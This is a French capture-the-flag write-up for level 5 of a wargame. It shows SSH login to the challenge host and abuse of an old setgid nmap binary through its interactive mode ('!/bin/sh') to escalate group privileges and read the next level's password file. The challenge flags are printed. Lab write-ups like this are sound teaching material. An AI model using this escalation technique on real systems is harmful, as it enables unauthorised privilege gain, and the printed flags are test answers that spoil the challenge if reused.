# Write up : Wargames

### Level 5

Consigne :

```
Consignes lvl5 :<br>
Le but de ce challenge est de récupérer un shell via l’exécutable disponible dans votre répertoire courant.<br>

Se connecter à l'adresse suivante : <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<FONT COLOR="#ff0000">ssh -p 6666 challenge5@game1.marshack.fr</FONT> <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;password : [flag obtenu dans l'épreuve précédente]
```

Connexion 

```bash
ssh -p 6666 challenge5@game1.marshack.fr
password: MARS{UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR}
```

Contenu du répertoire

```bash
challenge5@fb0a879ee360:~$ ls

nmap
```

Contrôle de l'uid

```
challenge5@fb0a879ee360:~$ id

uid=1004(challenge5) gid=1004(challenge5) groups=1004(challenge5)
```

Création d'une élévation de privilèges via un ancien binaire nmap.

Les commandes :

```
challenge5@be9f0e178887:~$ cd /home/challenge5
challenge5@be9f0e178887:~$ ./nmap --interactive
```

Vérification de l'élévation de privilèges.

Commande :

```bash
!id
uid=1004(challenge5) gid=1004(challenge5) egid=1005(challenge6) groupes=1004(challenge5)
system() execution of command failed    <=== ne pas tenir compte
```

On voit l'élévation de privilèges

```
egid=1005(challenge6)       <=== on fait partie du groupe challenge6
```

Dans nmap, exécuter /bin/sh pour obtenir un shell

```
!/bin/sh     (nota : /bin/bash ne permet pas l'élévation de privilège)
```

Chercher le password dans /etc/wargames_pass/level6/level6_password

```
cat /etc/wargames_pass/level6/level6_password
     MARS{mMwAr48BXzwavqjItEYk7zNhTBcMGS1S}

```



Résultat : MARS{mMwAr48BXzwavqjItEYk7zNhTBcMGS1S}